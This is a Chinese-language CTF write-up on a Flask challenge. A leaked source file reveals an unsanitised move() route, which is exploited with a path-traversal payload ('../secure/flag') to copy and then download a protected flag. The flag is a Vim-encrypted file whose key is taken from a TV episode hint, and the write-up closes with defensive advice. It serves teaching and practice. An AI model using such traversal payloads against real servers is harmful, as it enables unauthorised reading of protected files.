---
title: CTF Flask 目录穿越与 Vim 加密破解实战
description: 记录一道 Flask CTF 题目通过 move 接口目录穿越读取 flag、并结合剧集台词破解 Vim 加密文件的完整解题过程
category: uncategorized
tags:
- CTF
- Flask
- 目录穿越
- Vim加密
- Writeup
- 实战复现
date: '2024-01-15'
updated: '2026-11-12'
---

## 题目概览

本题为一道基于 Flask 框架的 Web CTF 挑战，核心考点包括：
- **目录穿越**：利用 `move()` 接口的文件名参数可控特性，通过 `../` 跳出 `upload` 目录读取 `secure/flag`
- **Vim 加密文件破解**：下载得到的 flag 为 Vim 加密格式，需通过剧集台词获取解密密钥

> 关联背景：类似的 Flask 路由与文件操作漏洞分析可参考 [[php伪协议与反序列化利用]] 中关于任意文件读取的利用链思路。

## 环境与源码分析

### 访问入口
首页提供 `upload` 与 `download` 两个功能点，直接访问均报错（方法错误 / error）。

### 源码泄露
通过查看页面源码发现 `source` 文件泄露，下载后得到完整 Flask 应用代码，主要包含四个路由函数：
- `upload()`：文件上传
- `download()`：文件下载（限定 `upload` 目录）
- `move()`：文件移动（核心漏洞点）
- `secure()`：文件访问（含 flag 保护逻辑）

### 关键代码片段

#### secure() —— flag 访问控制
```python
@app.route('/secure')
def secure():
    filename = request.args.get('filename')
    path = os.path.join('/secure', filename)
    if os.path.commonprefix([os.path.realpath(path), '/secure']) != '/secure' or filename == 'flag':
        return 'Error'
    return send_file(path)
```
**逻辑**：仅允许访问 `/secure` 目录下**非 flag** 文件 → flag 位于 `/secure/flag`。

#### download() —— 受限下载
```python
@app.route('/download')
def download():
    filename = request.args.get('filename')
    path = os.path.join('/upload', filename)
    if os.path.dirname(os.path.realpath(path)) != '/upload':
        return 'Error'
    return send_file(path)
```
**限制**：`os.path.dirname(os.path.realpath(path))` 强制锁定 `/upload` 目录，无法直接穿越至 `/secure`。

#### move() —— 可控文件读取与移动
```python
@app.route('/move', methods=['POST'])
def move():
    filename = request.args.get('filename')  # 从 GET 参数取值
    src = os.path.join('/upload', filename)
    dst = os.path.join('/secure', filename + str(uuid.uuid4()))
    with open(src, 'r') as f1, open(dst, 'w') as f2:
        content = f1.read()
        f2.write(content)
    return dst
```
**漏洞点**：
1. `filename` 来源于 **GET 参数**（`request.args`），但路由仅允许 **POST** 方法 → 需在 URL 查询串带参数、Body 发 POST 包
2. `src` 拼接前无路径规范化检查 → `../secure/flag` 可读取 flag 内容
3. 读取内容写入 `/secure/<filename><uuid>` 并返回完整路径 → 可通过返回路径再次访问

## 漏洞利用链

### 构造 Payload 读取 flag
```
POST /move?filename=../secure/flag HTTP/1.1
Host: <target>
Content-Length: 0
```
- 服务端读取 `/upload/../secure/flag` → 即 `/secure/flag`
- 内容被写入 `/secure/../secure/flag<uuid>`（实际落在 `/secure/flag<uuid>`）
- 响应返回类似 `/secure/flag550e8400-e29b-41d4-a716-446655440000`

### 访问生成的文件获取密文
```
GET /secure?filename=flag550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```
- 绕过 `secure()` 的 `filename != 'flag'` 校验
- 下载得到 **Vim 加密文件**（首行 `VimCrypt~02!`）

> 本地复现技巧：Flask 应用可用 `app.run(host='0.0.0.0', port=5000)` 快速启动调试。

## Vim 加密破解

### 文件识别
```bash
$ file flag_xxx
flag_xxx: Vim encrypted file data (version 2)
```
使用 `vim flag_xxx` 打开提示 `Need encryption key`。

### 线索搜集
- 首页显示 `User: Hanzawa` → 搜索发现日剧 **《半泽直树》 (Hanzawa Naoki)**
- 页面提示 `s2ep3` → 推断为 **第 2 季第 3 集**

### 密钥获取
观看 S02E03，约 **22 分钟** 处剧情中出现密码明文（截图见原文）。  
该密码即为 Vim 加密密钥。

### 解密验证
在 Vim 中输入密钥后成功打开文件，flag 显示于内容中。

## 知识点总结

| 环节 | 核心技术 | 防御建议 |
|------|----------|----------|
| 目录穿越 | `os.path.join` + 用户可控参数 + 无 `realpath` 校验 | 使用 `os.path.realpath` 规范化后校验前缀；采用 `secure_filename` |
| 方法混淆 | `request.args` 读取 GET 参数，路由限定 POST | 统一使用 `request.values` 或显式区分 `request.form` / `request.args` |
| Vim 加密 | Vim 自带加密 (blowfish2) 弱密码可爆破 | 敏感数据勿用编辑器加密；改用 GPG / age 等标准工具 |

## 交叉引用
- [[ctf-misc入门与工具箱]]：Misc 方向常见编码/加密识别与工具链
- [[usb流量取证与隐写综合实战]]：另一类结合多媒体隐写与取证的 CTF 实战链路
- [[007攻防实验室]]：更多实战归档入口

## 来源

- [007攻防实验室-202007-202010_7](../sources/007攻防实验室-202007-202010_7.md)
